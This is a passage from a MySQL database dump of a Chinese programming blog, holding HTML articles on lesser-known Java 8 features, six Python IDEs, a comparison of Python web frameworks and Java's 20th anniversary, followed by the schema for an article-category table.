8引入了一个新的读写锁，叫做StampedLock。它不仅更快，同时还提供了一系列强大的API来实现乐观锁，这样如果没有写操作在访问临界区域的话，你只需很低的开销就能获取到一个读锁。访问结束后你可以查询锁来判断这期间是否发生了写操作，如果有的话再选择进行重试，升级锁，或者放弃这个操作。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">这的确是一个非常强大的工具，它本身就值得专门花一篇文章来介绍。这个新玩意儿让我感到非常激动和兴奋，它真的是太棒了。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">想了解更多请点击<a href=\"http://javaspecialists.eu/talks/jfokus13/PhaserAndStampedLock.pdf\" style=\"color: rgb(0, 66, 118);\" target=\"_blank\">这里</a>。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>并发计数器</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">这是多线程程序会用到的另一个小工具。它提供了简单高效的新接口来实现多线程的并发读写计数器的功能，和AtomicInteger比起来，它要更快一些。相当赞的工具。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>Optional</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">不好，又有空指针了，这是所有Java开发人员的痛处。这估计是有史以来最常见的异常了，至少是<a href=\"http://en.wikipedia.org/wiki/Tony_Hoare\" style=\"color: rgb(0, 66, 118);\" target=\"_blank\">1965年</a>以来。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">Java 8借鉴了Scala和Haskell，提供了一个新的Optional模板，可以用它来封装可能为空的引用。这绝不是终结空指针的银弹，更多只是使API的设计者可以在代码层面声明一个方法可能会返回空值，调用方应该注意这种情况。正因为这个，这只对新的API有效，前提是调用方不要让引用逃逸出封装类，否则的话引用可能会在外面被不安全的废弃掉。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">我对这个新的特性真的是又爱又恨。一方面，空指针是一个大问题，只要能解决这个问题的东西我都欢迎。但另一方面，我对它是否能担此重任执怀疑的态度。这是由于使用它的话需要全公司的集体努力，短期内很难会有见效。除非大力地推广，否则很可能会功亏一篑。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>万物皆可注解</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">还有一个小的改进就是现在Java注解可以支持任意类型了。之前只有像类和方法声明之类的才能使用注解。在Java 8里面，当类型转化甚至分配新对象的时候，都可以在声明变量或者参数的时候使用注解。这是Java为了更好地支持静态分析及检测工具（比如FireBug)而做的工作中的一部分。这是个很不错的特性，但是和Java 7的invokeDynamic一样，它的真正价值取决于社区以后如何去使用它。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>数值溢出</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\"><a href=\"http://docs.oracle.com/javase/8/docs/api/java/lang/Math.html#addExact-int-int-\" style=\"color: rgb(0, 66, 118);\" target=\"_blank\">这些方法</a>早就该出现在Java的核心类库里了。我有个癖好就是去测试整型超出2^32时溢出的情况，搞出一些恶心的随机BUG来（怎么会得到这么奇怪的一个值？）。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">同样的，这也不是什么银弹，只不过是提供了一组函数，这样你在使用+/*操作符进行数值操作的时候，如果出现了溢出，会抛一个异常。如果我可以决定的话，我会把它作为JVM的默认模式，显式的标明函数会出现数值溢出。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>目录遍历</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">遍历目录树这种事通常都得上Google搜下怎么实现（你很可能用的是Apache.FileUtils）。Java 8给Files类做了一次整容手术，增加了十个新的方法。我最喜欢的一个是walk()方法，它遍历目录后会创建出一个惰性的流（文件系统很大的情况下非常有用）。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>增强的随机数生成</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">现在经常都在讨论密码或者密钥容易遭受攻击的事。程序的安全性是项很复杂的工程，并且很容易出错。这就是我为什么喜欢这个新的SecureRandom.getinstanceStrong()方法的原因，它能自动选择出当前JVM可用的最佳的随机数生成器。这样减少了获取失败的机率，同时也避免了默认的弱随机数生成器可能会导致密钥或者加密值容易被黑客攻破的问题。</span></p>\r\n\r\n<ul>\r\n	<li><span style=\"font-size:12px\"><strong>Date.toInstant()</strong></span></li>\r\n</ul>\r\n\r\n<p><span style=\"font-size:12px\">Java 8引入了一个新的日期API。这不难理解，因为现有的这个实在是太难用了。实际上Joda一直以来都是Java日期API的首选。不过尽管有了新的API，但仍有一个严重的问题&mdash;&mdash;大量的旧代码和库仍然在使用老的API。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">并且我们还知道这种现状仍将继续存在下去。到底该怎么做呢？</span></p>\r\n\r\n<p><span style=\"font-size:12px\">Java 8很优雅的解决了这个问题，它给Date类增加了一个新的方法toInstant()，它可以将Date转化成新的实现。这样你马上就可以切换到新的API，尽管现有的代码还在使用老的日期API（并且在可预见的未来仍将继续这样）。</span></p>\r\n\r\n<p><span style=\"font-size:12px\">如果你觉得有什么遗漏的或者你觉得我有什么讲的不对的地方，请不吝赐教。下面的评论框就是为这个而准备的:-)</span></p>\r\n\r\n<p><span style=\"font-size:12px\">原文链接：<a href=\"http://it.deepinmind.com/java/2014/05/03/10-features-in-java-8-you-havent-heard-of.html\" style=\"color: rgb(0, 66, 118);\">http://it.deepinmind.com/java/2014/05/03/10-features-in-java-8-you-havent-heard-of.html</a></span></p>\r\n',0,0,'Java 8那些被冷落的新特性',29,NULL,0),(73,0,'20150909043244',2,'<p><strong>概述：</strong>Python已经成为时下流行的编程语言，那么关于Python IDE你有哪些更好的选择呢？让我们一起来看看小编为您推荐的6款Python IDE吧！</p>\r\n\r\n<p>自从20世纪90年代初Python语言诞生至今，它逐渐被广泛应用于处理系统管理任务和Web编程。Python已经成为最受欢迎的程序设计语言之一,无论是初学者还是资深专家，对Python一致地赞不绝口。那么有哪些Python IDE比较实用呢？接下来小编就为大家介绍6款你不能错过的Python IDE。</p>\r\n\r\n<p><strong>1.Vim</strong></p>\r\n\r\n<p>Vim曾被戏称为有史以来&quot;最好的代码编辑器&quot;。这可能有点夸张了，但却足以表达Vim在很多开发人员心中的地位。不可否认学习Vim可能会花费一点时间，但一旦上手就能让开发人员的工作变得&quot;行云流水&quot;，着实是一款不错的Python IDE。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/22312441S-0.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n\r\n<p><strong>2.Emacs</strong></p>\r\n\r\n<p>Emacs是一个可扩展，可定制的编辑器，它是目前世界上最具可移植性的重要软件之一，能够在当前大多数操作系统上运行，包括类Unix系统（GNU/Linux、各种BSD、Solaris、AIX、IRIX、Mac OS X等等）、MS-DOS、Microsoft Windows以及OpenVMS等，还有移动Android平台以及iOS。同时Emacs既可以在文本终端也可以在图形用户界面（GUI）环境下运行。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/2231242003-1.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n\r\n<p><strong>3.Sublime</strong></p>\r\n\r\n<p>Sublime是一个先进的代码编辑器，它是由程序员Jon Skinner于2008年1月份所开发出来，其最初被设计为一个具有丰富扩展功能的Vim。同时Sublime具有漂亮的用户界面和强大的功能，例如代码缩略图，Python的插件，代码段等。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/2231245352-2.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n\r\n<p><strong>4.PyCharm</strong></p>\r\n\r\n<p>PyCharm是带有一整套可以帮助用户在使用Python语言开发时提高其效率的工具，比如调试、语法高亮、Project管理、代码跳转、智能提示、自动完成、单元测试、版本控制。此外，该IDE提供了一些高级功能，以用于支持Django框架下的专业Web开发。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/223124O49-3.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n\r\n<p><strong>5.<a href=\"http://www.evget.com/product/3023\" style=\"color: rgb(128, 0, 128); text-decoration: none; outline-style: none;\">Wing</a></strong></p>\r\n\r\n<p>Wing IDE是一个专为Python程序语言设计的集成开发环境,它其中包括大量语法标签的高亮显示。与其他类似的IDE相比，Wing IDE最大的特色是可以调试django应用。Wing IDE可运行在Windows, Linux 和Mac OS X系统上，而且只需要简单的几步就能使用。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/2231242025-4.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n\r\n<p><strong>6.Komodo</strong></p>\r\n\r\n<p>Komodo是一个支持多种语言同时跨平台（可用于 Windows、Mac OS X 和 Linux）的IDE。它非常强大，支持Perl、PHP、Python、Ruby、Tcl，以及JavaScript、CSS、HTML、XML。拥有后台语法检测、颜色匹配、错误捕捉、自动补齐等特性。值得一提的是，该IDE为用户提供了丰富的可扩展功能，支持类似firefox的xpi扩展。</p>\r\n\r\n<p><img alt=\"开发人员不能错过的6款Python IDE\" class=\"img-thumbnail\" src=\"http://img.kuqin.com/upimg/allimg/141108/2231241920-5.jpg\" style=\"border:none; margin:0px 0px 10px; max-width:580px; padding:0px\" /></p>\r\n',0,0,'推荐：6款优秀的Python IDE',33,NULL,0),(74,0,'20150909043446',2,'<p><strong>导读：作者</strong><a href=\"http://feilong.me/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>飞龙</strong></a><strong>写了一篇《</strong><a href=\"http://feilong.me/2011/01/talk-about-python-web-framework\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>浅谈Python Web框架</strong></a><strong>》，文中他介绍了几个Python Web框架和自己对选择框架的分析。在他看来，用<strong>Django</strong>来快速开发一些Web运用是很不错的<strong>选择。</strong>以下是文章内容：</strong></p>\r\n\r\n<p>说到Web Framework，Ruby的世界Rails一统江湖，而Python则是一个百花齐放的世界，各种micro-framework、framework不可胜数，不完全列表见：</p>\r\n\r\n<p><a href=\"http://wiki.python.org/moin/WebFrameworks\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\">http://wiki.python.org/moin/WebFrameworks</a>。</p>\r\n\r\n<p>虽然另一大脚本语言PHP也有不少框架，但远没有Python这么夸张，也正是因为Python Web Framework（Python Web开发框架，以下简称Python框架）太多，所以在Python社区总有关于Python框架孰优孰劣的话题，讨论的时间跨度甚至长达3-5年。</p>\r\n\r\n<p>Python这么多框架，能挨个玩个遍的人不多，坦白的说我也只用过其中的三个开发过项目，另外一些稍微接触过，所以这里只能浅谈一下，欢迎懂行的朋友们补充。</p>\r\n\r\n<p><a href=\"http://www.djangoproject.com/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Django</strong></a></p>\r\n\r\n<p><img alt=\"\" class=\"alignnone size-full wp-image-225\" src=\"http://cms.csdnimg.cn/articlev1/uploads/allimg/110217/100A14324-0.gif\" style=\"border:none; vertical-align:middle; width:117px\" title=\"hdr_logo\" /></p>\r\n\r\n<p>Python框架虽然说是百花齐放，但仍然有那么一家是最大的，它就是Django。要说Django是Python框架里最好的，有人同意也有人 坚决反对，但说Django的文档最完善、市场占有率最高、招聘职位最多估计大家都没什么意见。Django为人所称道的地方主要有：</p>\r\n\r\n<p>完美的文档，Django的成功，我觉得很大一部分原因要归功于Django近乎完美的官方文档（包括Django book）。</p>\r\n\r\n<p>全套的解决方案，Django象Rails一样，提供全套的解决方案（full-stack framework + batteries included），基本要什么有什么（比如：cache、session、feed、orm、geo、auth），而且全部Django自己造，开发网 站应手的工具Django基本都给你做好了，因此开发效率是不用说的，出了问题也算好找，不在你的代码里就在Django的源码里。</p>\r\n\r\n<p>强大的URL路由配置，Django让你可以设计出非常优雅的URL，在Django里你基本可以跟丑陋的GET参数说拜拜。</p>\r\n\r\n<p>自助管理后台，admin interface是Django里比较吸引眼球的一项contrib，让你几乎不用写一行代码就拥有一个完整的后台管理界面。</p>\r\n\r\n<p>而Django的缺点主要源自Django坚持自己造所有的轮子，整个系统相对封闭，Django最为人诟病的地方有：</p>\r\n\r\n<p>系统紧耦合，如果你觉得Django内置的某项功能不是很好，想用喜欢的第三方库来代替是很难的，比如下面将要说的ORM、Template。要在Django里用SQLAlchemy或Mako几乎是不可能，即使打了一些补丁用上了也会让你觉得非常非常别扭。</p>\r\n\r\n<p>Django自带的ORM远不如SQLAlchemy强大，除了在Django这一亩三分地，SQLAlchemy是Python世界里事实上的ORM标准，其它框架都支持SQLAlchemy了，唯独Django仍然坚持自己的那一套。Django的开发人员对SQLAlchemy的支持也是有 过讨论和尝试的，不过最终还是放弃了，估计是代价太高且跟Django其它的模块很难合到一块。</p>\r\n\r\n<p>Template功能比较弱，不能插入Python代码，要写复杂一点的逻辑需要另外用Python实现Tag或Filter。关于模板这一点，一直以来争论比较多，最近有两篇关于Python模板的比较有意思的文章可供参考：</p>\r\n\r\n<blockquote>\r\n<ol>\r\n	<li><a href=\"http://pydanny.blogspot.com/2010/12/stupid-template-languages.html\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\">http://pydanny.blogspot.com/2010/12/stupid-template-languages.html</a>（需翻墙）</li>\r\n	<li><a href=\"http://techspot.zzzeek.org/2010/12/04/in-response-to-stupid-template-languages/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\">http://techspot.zzzeek.org/2010/12/04/in-response-to-stupid-template-languages/</a></li>\r\n</ol>\r\n</blockquote>\r\n\r\n<p>URL配置虽然强大，但全部要手写，这一点跟Rails的Convention over configuration的理念完全相左，高手和初识Django的人配出来的URL会有很大差异。</p>\r\n\r\n<p>让人纠结的auth模块，Django的auth跟其它模块结合紧密，功能也挺强的，就是做的有点过了，用户的数据库schema都给你定好了，这样问题就来了，比如很多网站要求email地址唯一，可schema里这个字段的值不是唯一的，纠结是必须的了。</p>\r\n\r\n<p>Python文件做配置文件，而不是更常见的ini、xml或yaml等形式。这本身不是什么问题，可是因为理论上来说settings的值是能够动态的改变的（虽然大家不会这么干），但这不是最佳实践的体现。</p>\r\n\r\n<p>总的来说，Django大包大揽，用它来快速开发一些Web运用是很不错的。如果你顺着Django的设计哲学来，你会觉得Django很好用，越用越顺手；相反，你如果不能融入或接受Django的设计哲学，你用Django一定会很痛苦，趁早放弃的好。所以说在有些人眼里Django无异于仙丹， 但对有一些人来说它又是毒药且剧毒。</p>\r\n\r\n<p><a href=\"http://www.pylonshq.com/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Pylons</strong></a><strong>&nbsp;&amp;&nbsp;</strong><a href=\"http://turbogears.org/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>TurboGears</strong></a><strong>&nbsp;&amp;&nbsp;</strong><a href=\"http://bfg.repoze.org/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>repoze.bfg</strong></a></p>\r\n\r\n<p style=\"text-align:center\"><img alt=\"\" class=\"alignnone size-full wp-image-226\" src=\"http://cms.csdnimg.cn/articlev1/uploads/allimg/110217/100A14330-1.jpg\" style=\"border:none; vertical-align:middle; width:346px\" title=\"pylons_logo\" /></p>\r\n\r\n<p>除了Django另一个大头就是Pylons了，因为TurboGears2.x是基于Pylons来做的，而repoze.bfg也已经并入Pylons project里这个大的项目里，后面不再单独讨论TurboGears和repoze.bfg了。</p>\r\n\r\n<p>Pylons和Django的设计理念完全不同，Pylons本身只有两千行左右的Python代码，不过它还附带有一些几乎就是Pylons御用 的第三方模块。Pylons只提供一个架子和可选方案，你可以根据自己的喜好自由的选择Template、ORM、form、auth等组件，系统高度可 定制。我们常说Python是一个胶水语言(glue language)，那么我们完全可以说Pylons就是一个用胶水语言设计的胶水框架。</p>\r\n\r\n<p>选择Pylons多是选择了它的自由，选择了自由的同时也预示着你选择了噩梦：</p>\r\n\r\n<p>学习噩梦，Pylons依赖于许多第三方库，它们并不是Pylons造，你学Pylons的同时还得学这些库怎么使用，关键有些时候你都不知道你 要学什么。Pylons的学习曲线相对比Django要高的多，而之前Pylons的官方文档也一直是人批评的对象，好在后来出了<a href=\"http://pylonsbook.com/en/1.1/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\">The Definitive Guide to Pylons</a>这本书，这一局面有所改观。因为这个原因，Pylons一度被誉为只适合高手使用的Python框架。</p>\r\n\r\n<p>调试噩梦，因为牵涉到的模块多，一旦有错误发生就比较难定位问题处在哪里。可能是你写的程序的错、也可能是Pylons出错了、再或是SQLAlchemy出错了、搞不好是formencode有bug，反正很凌乱了。这个只有用的很熟了才能解决这个问题。</p>\r\n\r\n<p>升级噩梦，安装Pylons大大小小共要安装近20个Python模块，各有各自的版本号，要升级Pylons的版本，哪个模块出了不兼容的问题都有可能，升级基本上很难很难。至今reddit的Pylons还停留在古董的0.9.6上，SQLAlchemy也还是0.5.3的版本，应该跟这条有关系。</p>\r\n\r\n<p>Pylons和repoze.bfg的融合可能会催生下一个能挑战Django地位的框架。</p>\r\n\r\n<p><a href=\"http://www.tornadoweb.org/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Tornado&nbsp;</strong></a><strong>&amp;&nbsp;</strong><a href=\"http://webpy.org/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>web.py</strong></a></p>\r\n\r\n<p style=\"text-align:center\"><img alt=\"\" class=\"alignnone size-full wp-image-227\" src=\"http://cms.csdnimg.cn/articlev1/uploads/allimg/110217/100A13S9-2.png\" style=\"border:none; vertical-align:middle; width:286px\" title=\"tornado\" /></p>\r\n\r\n<p>Tornado即是一个Web server（对此本文不作详述），同时又是一个类web.py的micro-framework，作为框架Tornado的思想主要来源于Web.py，大家在Web.py的网站首页也可以看到Tornado的大佬Bret Taylor的这么一段话（他这里说的FriendFeed用的框架跟Tornado可以看作是一个东西）：</p>\r\n\r\n<p>&ldquo;[web.py inspired the] Web framework we use at FriendFeed [and] the webapp framework that ships with App Engine&hellip;&rdquo;</p>\r\n\r\n<p>因为有这层关系，后面不再单独讨论Tornado。</p>\r\n\r\n<p>Web.py的设计理念力求精简（Keep it simple and powerful），总共就没多少行代码，也不像Pylons那样依赖大量的第三方模块，而是只提供的一个框架所必须的一些东西，如：URL路由、 Template、数据库访问，其它的就交给用户自己去做好了。</p>\r\n\r\n<p>一个框架精简的好处在于你可以聚焦在业务逻辑上，而不用太多的去关心框架本身或受框架的干扰，同时缺点也很明显，许多事情你得自己操刀上。</p>\r\n\r\n<p>我个人比较偏好这种精简的框架，因为你很容易通过阅读源码弄明白整个框架的工作机制，如果框架那一块不是很合意的话，我完全可以Monkey patch一下按自己的要求来。</p>\r\n\r\n<p><a href=\"http://bottle.paws.de/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Bottle</strong></a><strong>&nbsp;&amp;&nbsp;</strong><a href=\"http://flask.pocoo.org/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Flask</strong></a></p>\r\n\r\n<p style=\"text-align:center\"><img alt=\"\" class=\"alignnone size-full wp-image-228\" src=\"http://cms.csdnimg.cn/articlev1/uploads/allimg/110217/100A1G10-3.png\" style=\"border:none; vertical-align:middle; width:276px\" title=\"bottle-logo\" /></p>\r\n\r\n<p>Bottle和Flask作为新生一代Python框架的代表，挺有意思的是都采用了decorator的方式配置URL路由，如：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[python]</strong>&nbsp;<a class=\"ViewSource\" href=\"http://www.csdn.net/article/2011-02-17/292058#\" style=\"cursor: pointer; color: rgb(160, 160, 160); text-decoration: none; background-image: url(http://csdnimg.cn/public/highlighter/img/ico_plain.gif); background-color: inherit; border: 0px; padding: 1px; margin: 0px 10px 0px 0px; font-size: 9px; display: inline-block; width: 16px; height: 16px; text-indent: -2000px; background-position: 0% 0%; background-repeat: no-repeat no-repeat;\" title=\"view plain\">view plain</a><a class=\"CopyToClipboard\" href=\"http://www.csdn.net/article/2011-02-17/292058#\" style=\"cursor: pointer; color: rgb(160, 160, 160); text-decoration: none; background-image: url(http://csdnimg.cn/public/highlighter/img/ico_copy.gif); background-color: inherit; border: 0px; padding: 1px; margin: 0px 10px 0px 0px; font-size: 9px; display: inline-block; width: 16px; height: 16px; text-indent: -2000px; background-position: 0% 0%; background-repeat: no-repeat no-repeat;\" title=\"copy\">copy</a></p>\r\n\r\n<p>Bottle、Flask跟web.py一样，都非常精简，Bottle甚至所有的代码都在那一个两千来行的.py文件里。另外Flask和Pylons一样，可以跟Jinja2、SQLAlchemy之类结合的很好。</p>\r\n\r\n<p>不过目前不管是Bottle还是Flask成功案例都还很少。</p>\r\n\r\n<p><a href=\"http://www.quixote.ca/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\"><strong>Quixote</strong></a></p>\r\n\r\n<p>之所以要特别说一下Quixote，是因为国内的最大的用Python开发的网站&ldquo;<a href=\"http://www.douban.com/\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\">豆瓣网</a>&rdquo;是用Quixote开发的。我只简单翻了一下源代码，没有做过研究，不发表评论，有经验的来补充下。我只是在想，如果豆瓣网交到现在来开发，应该会有更多的选择。</p>\r\n\r\n<p><strong>其它（web2py、uliweb、Karrigell、Werkzeug &hellip;）</strong></p>\r\n\r\n<p><strong>最后关于框架选择的误区</strong></p>\r\n\r\n<p>在框架的选择问题上，许多人很容易就陷入了下面两个误区中而不自知：</p>\r\n\r\n<p>1. 哪个框架最好&mdash;&mdash;世上没有最好的框架，只有最适合你自己、最适合你的团队的框架。编程语言选择也是一个道理，你的团队Python最熟就用Python好了，如果最熟悉的是Ruby那就用Ruby好了，编程语言、框架都只是工具，能多、快、好、省的干完活就是好东西。</p>\r\n\r\n<p>2. 过分关注性能&mdash;&mdash;其实大部分人是没必要太关心框架的性能的，因为你开发的网站根本就是个小站，能上1万的IP的网站已经不多了，上10万的更是很少很少。在没有一定的访问量前谈性能其实是没有多大意义的，因为你的CPU和内存一直就闲着呢。而且语言和框架一般也不会是性能瓶颈，性能问题最常出现在数据库访问和文件读写上。 PHP的Zend Framework是出了名的慢，但是Zend Framework一样有大站，如：digg.com；常被人说有性能问题的Ruby和Rails，不是照样可以开发出twitter吗？再者现在的硬 件、带宽成本其实是很低的，特别有了云计算平台后，人力成本才是最贵的，没有上万的IP根本就不用太在意性能问题，流量上去了花点钱买点服务器空间好了， 简单快速的解决性能问题。</p>\r\n\r\n<p>注：前面有网友质疑我&ldquo;Quora是用Pylons开发的&rdquo;这样的说法不客观，特说明一下，这里所说的某个网站A是用B开发的，只是指A主要或部分是由B开发的，大家就不要再去纠结A还用C了。</p>\r\n\r\n<p>原文链接：<a href=\"http://feilong.me/2011/01/talk-about-python-web-framework\" style=\"cursor: pointer; color: rgb(0, 102, 204); text-decoration: none;\" target=\"_blank\">http://feilong.me/2011/01/talk-about-python-web-framework</a></p>\r\n',0,0,'浅谈五大Python Web框架',19,NULL,0),(75,0,'20150921001940',2,'<p>作者：甲骨文公司全球副总裁中国区中间件业务总经理 晏翔 　　</p>\r\n\r\n<p>2015年5月23日， Java诞生20周年。 细数IT的语言开发平台，从汇编到BASIC;从CORBA到FORTRAN;从PASCAL到C，C++，.NET&hellip; ，似乎每个语言都曾闪耀一时，而Java凭借卓越的通用性、高效性、平台移植性和安全性，被广泛应用于PC、数据中心、游戏控制台、科学超级计算机、移动电话和互联网，从个人IT到企业应用无处不在，如果把Java定义为IT史上迄今为止最成功的计算机语言，就算是最擅吐嘈的年轻人想必也不会有太大异议。</p>\r\n\r\n<p><strong>精雕细琢 问题从来都不是问题</strong></p>\r\n\r\n<p>从SUN公司具有前瞻性的启蒙，到BEA公司向企业层面的扩展，再到甲骨文收购后的日益成熟， Java走过的二十年可谓多彩。 随着Java 7，Java 8及Weblogic12c Java应用服务器等明星级工具的出现，Java似乎已经将触角延伸至最大领域。然而，问题也随之产生：Java的研发初衷是为了解决垃圾回收系统、可移植的安全性、分布程序设计和多线程功能等问题，但是随着这些系统的不断变大，很多新兴工具在长期运行时在实用性和耐用性方面显现出疲态。</p>\r\n\r\n<p>由SUN、BEA、甲骨文三家公司精英组成的Java研发团队敏锐地发现了这个问题，本着甲骨文对市场更加开放的承诺, Java从JDK7 u40版本开始便在JDK工具模块中添加了一个新的成员: 涵盖工作时间分析和诊断工具套件在内的甲骨文Java任务控制套件，为开发者集中解决在Java或其他开发平台上进行开发时可能遇到的问题。该任务控制套件最初为JRockit的一部分，用于提供实时性能分析。JRockit团队在评估用户提供的绝密交易应用中发现了客户应用程序的滞后性，因此决定建立一个足够低开销的工具来收集生产数据，结果发现该工具取得了十分显著的成效，许多用户开始询问该工具的授权问题。于是，一个融合了更多资源的商业型JRockit任务控制套件由此诞生。甲骨文在收购SUN公司后，突然拥有了两个市场上最常用的通用Java虚拟机。其中，HotSpot JVM是开源的JVM，代码库和许可证广为人知;另一个是JRockitJVM，拥有鲜为人知的代码库及快速、精致及轻量级的特点。甲骨文希望取两&ldquo;机&rdquo;所长，借助于可用资源打造市场上最佳Java虚拟机，而打造的基础，就是这两个虚拟机共有的特性&mdash;&mdash;JRockit任务控制套件。随着Java HotSpot VM功能的不断增加，甲骨文Java任务控制套件因需而生。该套件包含两个类似JRockit任务控制工具：Java管理扩展(JMX)控制台和Java JRockit Flight Recorder，从Java 8开始实施应用。</p>\r\n\r\n<p>同时，甲骨文还打造了一款Java高级管理控制台，使应用的目的更加明确。Java高级管理控制台的功能可以分为两部分：第一，为使用者直接追踪与Java应用程序相关使用数据;第二，使管理员根据这些数据执行相关操作。通过使用Java高级管理控制台，用户可以获得一个安全、可控的运行环境及更好的终端用户体验。具体说来，Java高级管理控制台能够获取当前哪些网络应用程序(Java小程序和Java Web Start应用程序)正在企业内部运行以及运行在哪个版本的Java运行环境(JRE)。除此之外，Java高级管理控制台还可以帮助系统管理员从企业内部客户端中获取大量信息，例如：每一个应用的运行位置，服务提供商，访问权限，以及这个应用程序被运行的次数。高级管理控制台帮助系统管理员更简单地管理网络应用程序和Java实时运行环境，并且提供了通过部署规则集控制老版本Java兼容性和可用性的工具，而这些功能都能为终端用户带来更流畅的用户体验。</p>\r\n\r\n<p><strong>在云和物联网大潮中再次焕发青春</strong></p>\r\n\r\n<p>在Java任务控制套件和Java高级管理控制台的双重保障下，Java进入到了使用的新纪元，而同样进入这个纪元的，还有云计算和物联网。作为最常用的云计算底层开发语言，Java的安全性、开放性、稳定性和跨平台性与云计算高可靠、高拓展的优势相得益彰。加入甲骨文后，Java更是加快了向云端靠拢的步伐。Java8中多租户和模块化的功能使大规模的云部署变得简单，连Google App Engine从仅支持Python发展到了支持Java的加入。同时，在日益重要的物联网方面，甲骨文公司正大力将Java推向嵌入式系统，随着中间件的兴起，企业更多地在内部采纳Java，而诸如飞思卡尔这样的处理器领导者也加入嵌入式Java的阵营。针对互联网缺乏统一互联标准的问题，飞思卡尔与甲骨文合作推出了一个平台化的&ldquo;一体化盒子One Box&rdquo;物联网解决方案，令开发者无论基于哪种环境都能够在统一的Linux操作系统下进行开发，大大简化了开发流程。</p>\r\n\r\n<p>成名于互联网，掀起于云端，Java一路上不算平坦却能披荆斩棘。在Java 20周年到来之际，我们带着更多祝福、更深期盼希望Java的云端的下个二十年能够飞得更高更远，续写辉煌。</p>\r\n\r\n<p>原文出自【比特网】，转载请保留原文链接：http://soft.chinabyte.com/68/13323068.shtml</p>\r\n',0,0,'20载JAVA故事 奔跑中精雕细琢',4,NULL,0);
/*!40000 ALTER TABLE `article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `article_category`
--

DROP TABLE IF EXISTS `article_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article_category` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `article_id` bigint(20) DEFAULT NULL,
  `category_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `FKDBC75627E792E6AC` (`article_id`),
  KEY `FKDBC75627AA78CA61` (`category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=78 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article_category`
--

LOCK TABLES `article_category` WRITE;
/*!40000 ALTER TABLE `article_category` DISABLE KEYS */;
